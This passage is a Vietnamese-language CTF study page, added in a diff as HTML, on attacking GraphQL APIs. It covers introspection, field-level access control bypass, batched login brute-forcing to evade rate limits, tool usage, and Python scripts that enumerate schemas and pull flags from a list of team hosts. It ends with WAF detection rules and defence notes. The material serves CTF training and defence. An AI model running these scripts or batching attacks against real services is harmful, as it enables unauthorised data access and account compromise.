@@ -1,0 +1,524 @@
+<title>GraphQL — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · GraphQL Security</div>
+    <h1>GraphQL — Khai thác cơ bản</h1>
+    <p class="sub">GraphQL là 1 cách thiết kế API khác REST: thay vì nhiều endpoint cố định
+    (<code>/users/1</code>, <code>/posts/2</code>...), toàn bộ ứng dụng chỉ có <strong>1 endpoint duy nhất</strong>
+    (thường <code>/graphql</code>), và CLIENT tự chọn muốn lấy trường dữ liệu nào trong 1 request. Sức mạnh này
+    cũng là nguồn gốc nhiều lỗ hổng: lộ toàn bộ "bản đồ API" qua introspection, bypass access control vì 1 field
+    quên check quyền, và DoS vì query lồng nhau không giới hạn.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>GraphQL khác REST thế nào, và lỗ hổng nằm ở đâu</h2>
+  <p class="lead">Mọi request GraphQL (gần như luôn) là <strong>POST tới 1 URL duy nhất</strong>
+  (<code>/graphql</code>), body dạng JSON có khoá <code>"query"</code> chứa cú pháp truy vấn riêng của GraphQL.
+  3 lỗ hổng hay gặp nhất: (1) <strong>Introspection bật</strong> — bất kỳ ai cũng hỏi được "API này có những
+  field/type nào" → lộ toàn bộ sơ đồ dữ liệu kể cả field không công khai trên UI; (2) <strong>Broken Access
+  Control theo field</strong> — field/mutation lẻ quên check quyền dù endpoint chung có auth; (3)
+  <strong>Batching/Nested query</strong> — gửi hàng trăm query/mutation trong 1 request để bypass rate-limit
+  hoặc brute-force.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Việc đầu tiên luôn làm với bất kỳ endpoint GraphQL nào: thử introspection query (mục 06.A) — nếu thành công,
+  bạn có ngay "bản đồ" toàn bộ API để tìm field nhạy cảm, không cần đoán mò.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ GRAPHQL</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có request POST tới <code>/graphql</code> hoặc <code>/api/graphql</code> với body JSON chứa
+        <code>{"query": "..."}</code> ⟹ chắc chắn 100% là GraphQL.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Không cần gì đặc biệt — chỉ cần biết đúng URL endpoint (thử cả <code>/graphql</code>,
+        <code>/api/graphql</code>, <code>/v1/graphql</code> nếu không bắt được request mẫu).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Gửi introspection query (mục 06.A) — nếu response trả về JSON đầy field <code>__schema</code>,
+        <code>types</code>... ⟹ introspection đang MỞ, khai thác được ngay.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (introspection)</span>
+<pre><code>curl -s -X POST http://TARGET/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | python3 -m json.tool</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+
+INTROSPECTION = <span class="s">'{__schema{types{name,fields{name,args{name}}}}}'</span>
+r = requests.post(<span class="s">"http://TARGET/graphql"</span>, json={<span class="s">"query"</span>: INTROSPECTION})
+<span class="k">for</span> t <span class="k">in</span> r.json()[<span class="s">"data"</span>][<span class="s">"__schema"</span>][<span class="s">"types"</span>]:
+    <span class="k">if</span> t[<span class="s">"fields"</span>]:
+        <span class="k">print</span>(t[<span class="s">"name"</span>], [f[<span class="s">"name"</span>] <span class="k">for</span> f <span class="k">in</span> t[<span class="s">"fields"</span>]])</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Nếu introspection bị tắt (production chuẩn thường tắt), dùng công cụ <code>clairvoyance</code> (mục 07)
+        để "đoán lại" field name qua thông báo lỗi gợi ý ("Did you mean..."). WAF rule nhanh: chặn query có
+        chứa <code>__schema</code> hoặc <code>__type</code> trong body JSON field <code>query</code> — chính là
+        cách tắt introspection ở tầng mạng khi chưa sửa được code.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Query</b> — yêu cầu ĐỌC dữ liệu (tương đương GET trong REST), bạn tự chọn field muốn lấy.</div>
+  <div class="def"><b>Mutation</b> — yêu cầu THAY ĐỔI dữ liệu (tương đương POST/PUT/DELETE trong REST): tạo,
+  sửa, xoá.</div>
+  <div class="def"><b>Schema</b> — "bản thiết kế" toàn bộ API: định nghĩa có những Type (kiểu dữ liệu) nào,
+  mỗi Type có field gì, mỗi field nhận tham số (argument) gì.</div>
+  <div class="def"><b>Introspection</b> — tính năng TỰ MÔ TẢ của GraphQL: gửi 1 query đặc biệt
+  (<code>{__schema{...}}</code>) để API tự trả về toàn bộ schema của chính nó — rất tiện cho dev (tool tự sinh
+  doc/autocomplete), nhưng nếu không tắt ở production, kẻ tấn công cũng dùng được để xem toàn bộ "bản đồ" API.</div>
+  <p>Ví dụ 1 query và response tương ứng:</p>
+  <pre><code><span class="c">// Request (POST /graphql, Content-Type: application/json)</span>
+{"query": "{ user(id: 1) { name email } }"}
+
+<span class="c">// Response</span>
+{"data": {"user": {"name": "alice", "email": "alice@example.com"}}}</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Linh hoạt cho dev = dễ sót cho security</h2>
+  <p>GraphQL cố ý thiết kế rất linh hoạt: 1 endpoint, client tự chọn field, dễ mở rộng thêm type/field mới. Hệ
+  quả: (1) dev thường QUÊN TẮT introspection khi deploy production (mặc định của nhiều framework là MỞ); (2)
+  access control phải được check Ở TỪNG FIELD/RESOLVER riêng lẻ (không có khái niệm "route" chung để áp
+  middleware 1 lần như REST) — rất dễ sót 1 field; (3) không có giới hạn tự nhiên về độ sâu/độ phức tạp của
+  query — client có thể gửi query lồng 50 cấp, gây tải cực lớn cho server (DoS).</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>1 endpoint, N cách khai thác khác nhau</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr24)}
+    </style>
+    <defs><marker id="arr24" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="250" y="10" width="180" height="40" rx="8" class="box-a"/>
+    <text x="262" y="34" class="lbl-a">POST /graphql (1 endpoint)</text>
+
+    <path d="M270,55 V80" class="arrow"/>
+    <rect x="10" y="85" width="190" height="45" rx="8" class="box"/>
+    <text x="22" y="105" class="lbl-m">query { __schema { ... } }</text>
+    <text x="22" y="119" class="lbl-a">-&gt; lộ toàn bộ sơ đồ API</text>
+
+    <path d="M340,55 V80" class="arrow"/>
+    <rect x="245" y="85" width="190" height="45" rx="8" class="box"/>
+    <text x="257" y="105" class="lbl-m">query { adminField }</text>
+    <text x="257" y="119" class="lbl-a">-&gt; field quên check quyền</text>
+
+    <path d="M480,55 V80" class="arrow"/>
+    <rect x="480" y="85" width="190" height="45" rx="8" class="box"/>
+    <text x="492" y="105" class="lbl-m">mutation { login(...) }</text>
+    <text x="492" y="119" class="lbl-a">-&gt; lặp 500 lần trong 1 request</text>
+
+    <rect x="10" y="150" width="660" height="60" rx="10" class="box"/>
+    <text x="22" y="172" class="lbl-m" font-style="italic">Điểm chung: tất cả đi qua CÙNG 1 URL, cùng method POST --</text>
+    <text x="22" y="188" class="lbl-m" font-style="italic">WAF theo URL/method truyền thống (như chặn theo route REST)</text>
+    <text x="22" y="203" class="lbl-m" font-style="italic">hoàn toàn không phân biệt được 3 kiểu tấn công này.</text>
+  </svg>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Cách tìm endpoint GraphQL nếu chưa thấy rõ</h2>
+  <ul>
+    <li>Xem request JS bundle (Burp/DevTools) tìm chuỗi <code>/graphql</code>.</li>
+    <li>Thử trực tiếp các path phổ biến: <code>/graphql</code>, <code>/api/graphql</code>,
+    <code>/graphql/console</code>, <code>/v1/graphql</code>.</li>
+    <li>Nhiều framework có GraphiQL/GraphQL Playground — UI tương tác đẹp, thường ở
+    <code>/graphiql</code> hoặc cùng path <code>/graphql</code> khi mở bằng browser (GET) thay vì POST — nếu
+    còn mở ở production, coi như introspection chắc chắn bật và có luôn giao diện thử query.</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước) — dùng extension InQL</h2>
+  <div class="note burp"><span class="tag">InQL tự sinh query từ schema</span>
+  <ol style="margin:4px 0 0">
+    <li>BApp Store (hoặc đã có offline) → cài extension <strong>InQL Scanner</strong>.</li>
+    <li>Gửi 1 request GraphQL bất kỳ tới Repeater → chuột phải → <strong>InQL</strong> → "Send to InQL" (hoặc
+    mở tab InQL, nhập URL endpoint trực tiếp).</li>
+    <li>InQL tự chạy introspection, PHÂN TÍCH schema, và tự sinh sẵn danh sách TOÀN BỘ query/mutation hợp lệ
+    (kèm đủ tham số mẫu) — không cần tự viết tay từng query.</li>
+    <li>Duyệt qua danh sách, tìm field/mutation nghe "nhạy cảm" (<code>isAdmin</code>, <code>deleteUser</code>,
+    <code>internalNotes</code>...), gửi thử từng cái bằng token user thường — field nào trả dữ liệu dù không
+    nên có quyền ⟹ Broken Access Control.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG</div>
+  <h2>3 payload nền tảng</h2>
+
+  <h3>A. Introspection đầy đủ</h3>
+  <div class="pbreak">
+    <div class="ph">{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { name fields { name args { name type { name } } type { name } } } "}</div>
+    <div class="pb">
+      <div class="part">Phiên bản RÚT GỌN nhanh để test trước (nếu thành công mới chạy bản đầy đủ):
+      <code>{"query":"{__schema{types{name}}}"}</code></div>
+    </div>
+    <div class="resp">Response thành công trả JSON với <code>data.__schema.types</code> là danh sách toàn bộ
+    Type trong hệ thống.</div>
+  </div>
+
+  <h3>B. Dò field nhạy cảm sau khi có schema</h3>
+  <pre><code>{"query": "{ user(id: 1) { name email isAdmin internalNotes } }"}</code></pre>
+  <p>Thử thêm field bất kỳ tên trong schema vào — nếu field đó tồn tại nhưng app không che với user thường,
+  bạn thấy ngay dữ liệu (vd <code>internalNotes</code> lẽ ra chỉ admin xem được).</p>
+
+  <h3>C. Batching — gửi nhiều query trong 1 request (bypass rate-limit)</h3>
+  <pre><code>[
+  {"query": "{ login(user:\"admin\", pass:\"guess1\") { token } }"},
+  {"query": "{ login(user:\"admin\", pass:\"guess2\") { token } }"},
+  {"query": "{ login(user:\"admin\", pass:\"guess3\") { token } }"}
+]</code></pre>
+  <p>Nhiều server GraphQL hỗ trợ gửi 1 ARRAY query trong 1 request HTTP — rate-limit đếm theo SỐ REQUEST HTTP
+  sẽ chỉ tính đây là 1 request, dù thực chất có 3 lần thử đăng nhập. Rất hiệu quả để brute-force mà không chạm
+  giới hạn 30 submissions/phút của giải (lưu ý: chỉ dùng kỹ thuật này hợp lệ trong phạm vi A/D được phép, không
+  phải cách lách luật nộp flag).</p>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN</div>
+  <h2>InQL, clairvoyance, graphql-cop</h2>
+
+  <h3>A. InQL — Burp extension, tự sinh query từ schema</h3>
+  <p>Cài qua Burp BApp Store (cần Internet 1 lần để tải — làm trước ngày thi). Công dụng: tự động hoá hoàn
+  toàn mục 05, biến schema thành danh sách query sẵn sàng gửi, không cần tự viết cú pháp GraphQL tay.</p>
+
+  <h3>B. clairvoyance — đoán lại schema khi introspection BỊ TẮT</h3>
+  <div class="def"><b>clairvoyance</b> — khi introspection đã tắt (production chuẩn), công cụ này lợi dụng
+  thông báo lỗi "gợi ý" của nhiều server GraphQL (kiểu <code>Did you mean "userById"?</code> khi gõ sai tên
+  field) để DÒ LẠI từng field/type một, dần dần "đoán ra" được gần hết schema dù introspection đã tắt. Đã clone
+  về <code>~/hoc/CTF/Tools/web/clairvoyance/</code> (từ <code>nikitastupin/clairvoyance</code>, 1500+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/clairvoyance
+pip install -e .   <span class="c"># cài 1 lần</span>
+clairvoyance -o schema.json http://TARGET/graphql
+<span class="c"># Kết quả: file schema.json chứa schema đã "đoán lại" được</span></code></pre>
+
+  <h3>C. graphql-cop — scan nhanh các lỗi cấu hình phổ biến</h3>
+  <div class="def"><b>graphql-cop</b> — quét tự động 1 danh sách lỗi cấu hình GraphQL kinh điển: introspection
+  bật, batching bật (DoS/brute-force), field suggestion bật (giúp clairvoyance dễ hơn), CSRF qua GraphQL
+  GET... Đã clone về <code>~/hoc/CTF/Tools/web/graphql-cop/</code> (từ <code>dolevf/graphql-cop</code>, 700+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/graphql-cop
+pip install -r requirements.txt
+python3 graphql-cop.py -t http://TARGET/graphql</code></pre>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+URL = <span class="s">"http://TARGET/graphql"</span>
+
+<span class="c"># Bước 1: introspection rút gọn, kiểm tra có mở không</span>
+r = requests.post(URL, json={<span class="s">"query"</span>: <span class="s">"{__schema{types{name}}}"</span>})
+<span class="k">print</span>(r.json())
+
+<span class="c"># Bước 2: nếu có type "User", thử lấy field nhạy cảm</span>
+r = requests.post(URL, json={<span class="s">"query"</span>: <span class="s">'{ user(id: 1) { name email isAdmin } }'</span>})
+<span class="k">print</span>(r.json())</code></pre>
+
+  <h3>(B) Bản gọn chắc — tự quét toàn bộ type/field, tìm field "nhạy cảm" theo từ khoá</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SENSITIVE_WORDS = [<span class="s">"admin"</span>, <span class="s">"secret"</span>, <span class="s">"flag"</span>, <span class="s">"internal"</span>, <span class="s">"token"</span>, <span class="s">"password"</span>]
+
+<span class="k">def</span> <span class="d">get_schema</span>(url):
+    q = <span class="s">"{__schema{types{name fields{name}}}}"</span>
+    r = requests.post(url, json={<span class="s">"query"</span>: q}, timeout=5)
+    <span class="k">return</span> r.json().get(<span class="s">"data"</span>, {}).get(<span class="s">"__schema"</span>, {}).get(<span class="s">"types"</span>, [])
+
+<span class="k">def</span> <span class="d">find_sensitive_fields</span>(url):
+    hits = []
+    <span class="k">for</span> t <span class="k">in</span> get_schema(url):
+        <span class="k">for</span> f <span class="k">in</span> (t.get(<span class="s">"fields"</span>) <span class="k">or</span> []):
+            <span class="k">if</span> any(w <span class="k">in</span> f[<span class="s">"name"</span>].lower() <span class="k">for</span> w <span class="k">in</span> SENSITIVE_WORDS):
+                hits.append((t[<span class="s">"name"</span>], f[<span class="s">"name"</span>]))
+    <span class="k">return</span> hits
+
+<span class="k">print</span>(find_sensitive_fields(<span class="s">"http://TARGET/graphql"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — query khai thác cố định (sau khi đã tìm field đúng 1 lần)</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+<span class="c"># Điền field đúng sau khi đã dò bằng bản (B) 1 lần trên service mẫu</span>
+EXPLOIT_QUERY = <span class="s">'{ adminPanel { flag } }'</span>
+
+<span class="k">def</span> <span class="d">exploit_graphql</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/graphql"</span>, json={<span class="s">"query"</span>: EXPLOIT_QUERY}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_graphql(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Thấy JS bundle gọi <code>fetch("/graphql", {method:"POST", body: JSON.stringify({query:...})})</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Introspection</div><div class="d">Gửi <code>{__schema{types{name}}}</code> → thành công, thấy type <code>AdminPanel</code> lạ không có trên UI.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Khám phá field</div><div class="d">Introspect sâu hơn <code>AdminPanel</code> → thấy field <code>flag</code> bên trong.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Thử truy cập không cần quyền</div><div class="d">Gửi <code>{ adminPanel { flag } }</code> KHÔNG kèm token admin → vẫn trả dữ liệu ⟹ Broken Access Control xác nhận.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Response: <code>{"data":{"adminPanel":{"flag":"FHACKER2026{...}"}}}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (trên body JSON field "query")</th><th>Khớp gì</th></tr>
+    <tr><td><code>__schema|__type\b</code></td><td>Introspection query — nếu app KHÔNG cần introspection ở production, chặn an toàn, false positive gần như 0</td></tr>
+    <tr><td>Body là JSON ARRAY (bắt đầu bằng <code>[</code>) gửi tới endpoint GraphQL</td><td>Batching — nhiều app hợp lệ không cần batching, có thể chặn nếu app không dùng tính năng này</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Giới hạn thực tế</span>Broken Access Control theo field (mục 09) KHÔNG
+  có dấu hiệu bất thường nào trong chính câu query — field đó về CÚ PHÁP hoàn toàn hợp lệ và giống mọi field
+  khác. WAF không thể phân biệt được "field hợp lệ do user thường gọi" với "field hợp lệ nhưng chỉ admin được
+  gọi" — đây là lỗi PHẢI fix ở code (thêm check quyền đúng ở resolver), không có cách chặn ở tầng mạng.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không khai thác được ngay</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Introspection trả lỗi "introspection is disabled"</td><td>App đã tắt đúng cách</td><td>Dùng clairvoyance (mục 07.B) để đoán lại schema qua field suggestion, nếu app cũng tắt suggestion thì phải đoán tên field bằng wordlist/convention thông thường (camelCase các danh từ hay gặp: user, post, comment, admin...)</td></tr>
+    <tr><td>Query hợp lệ nhưng trả <code>null</code> cho mọi field</td><td>Thiếu tham số bắt buộc (argument) mà bạn chưa biết tên đúng</td><td>Xem lại phần <code>args</code> trong kết quả introspection đầy đủ (mục 06.A) để biết tên và kiểu tham số chính xác</td></tr>
+    <tr><td>GraphiQL/Playground thấy được nhưng gửi API trực tiếp lại lỗi CORS/CSRF token</td><td>Endpoint yêu cầu header đặc biệt (vd <code>X-Requested-With</code>) mà GraphiQL tự thêm còn script của bạn thì không</td><td>Bắt request thật từ GraphiQL qua Burp, copy đủ toàn bộ header cần thiết vào script</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
